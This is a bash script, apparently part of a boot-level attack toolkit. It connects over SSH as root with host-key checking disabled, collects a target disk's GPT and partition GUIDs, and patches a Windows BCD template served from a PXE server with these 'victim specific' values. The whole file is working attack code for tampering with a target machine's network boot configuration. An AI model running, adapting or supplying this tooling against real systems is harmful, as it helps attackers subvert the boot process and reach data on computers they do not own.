#!/bin/bash

PARTITION=$1
SEARCHSTRING1="\x12\x34\x56\x78\x13\x37\x11\x11\x13\x37\x12\x34\x56\x78\x91\x23"
SEARCHSTRING2="\x12\x34\x56\x78\x13\x37\x22\x22\x13\x37\x12\x34\x56\x78\x91\x23"

function echo-info {
    echo -e "\e[33;1m[+]\e[0m \e[33mInfo: $1\e[0m" >&2
}

function echo-warning {
    echo -e "\e[31;1m[!] Warning: $1\e[0m" >&2
}

function printInfo {
  echo -e "\e[33;1mUsage: $0 <drive>\e[0m"
  echo -e "\e[33;1m Example: $0 /dev/sda\e[0m"
}

# I found a VBS converter for GUIDs and ported it to bash: https://learn.microsoft.com/en-us/troubleshoot/windows-server/admin-development/convert-string-guid-to-hexadecimal-string
function GuidToHex {
    GUID=$1

    # Remove unnecessary symbols
    tmpGUID=`echo "$GUID" | tr -d '{}-'`

    # Reorder octets
    octetStr="${tmpGUID:6:2}"
    octetStr+="${tmpGUID:4:2}"
    octetStr+="${tmpGUID:2:2}"
    octetStr+="${tmpGUID:0:2}"
    octetStr+="${tmpGUID:10:2}"
    octetStr+="${tmpGUID:8:2}"
    octetStr+="${tmpGUID:14:2}"
    octetStr+="${tmpGUID:12:2}"
    octetStr+="${tmpGUID:16}"

    # Create hex entities for sed replacement
    hexCommaStr=$(echo "$octetStr" | sed 's/\(..\)/,\1/g')
}


# Exit if no device is specified
if [[ "$1" != *"dev"* ]]; then
    echo-warning "No drive specified!"
    printInfo
    exit
fi

# Get GUIDs via SSH
echo-info "Grabbing disk and partition GUIDs via SSH..."
# TODO: Edge case for multiple hard drives?!
HDGPTSIG=$(ssh -tt -q -o StrictHostKeyChecking=no root@10.13.37.101 'fdisk -l | grep "Disk identifier (GUID)" | cut -d" " -f 4' 2>&1)
PARTGUID=$(ssh -tt -q -o StrictHostKeyChecking=no root@10.13.37.101 'sgdisk --info=3 "'$PARTITION'" | grep "Partition unique GUID"  | cut -d" " -f 4' 2>&1 )

# To uppercase
HDGPTSIG=$(echo $HDGPTSIG | tr '[A-Z]' '[a-z]')
PARTGUID=$(echo $PARTGUID | tr '[A-Z]' '[a-z]')

# To Hex entities
GuidToHex $HDGPTSIG
HDGPTSIGHEX=$hexCommaStr
GuidToHex $PARTGUID
PARTGUIDHEX=$hexCommaStr

echo-info "Got the following GUIDs:"
echo "Disk identifier: $HDGPTSIG"
echo "Partition unique GUID: $PARTGUID"
echo ""

# Create registry patch file
echo-info "Creating registry patch file..."
echo "Windows Registry Editor Version 5.00" > /tmp/patch.reg
echo "" >> /tmp/patch.reg
echo "[\Objects\{15af3c5d-ca12-11ef-ae97-b097f8aa0112}\Elements\11000001]" >> /tmp/patch.reg
echo '"Element"=hex(3):00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,06,00,00,00,00,00,00,00,48,00,00,00,00,00,00,00'"$PARTGUIDHEX"',00,00,00,00,00,00,00,00'"$HDGPTSIGHEX"',00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00' | tr -d '\r' >> /tmp/patch.reg

# Copy BCD template
echo-info "Patching BCD template with victim specific GUIDs..."
cp -f pxe-server/Boot/BCD-template pxe-server/Boot/BCD

# Merge patch into BCD file
hivexregedit --merge pxe-server/Boot/BCD /tmp/patch.reg

echo-info "Created modified BCD file: pxe-server/Boot/BCD"
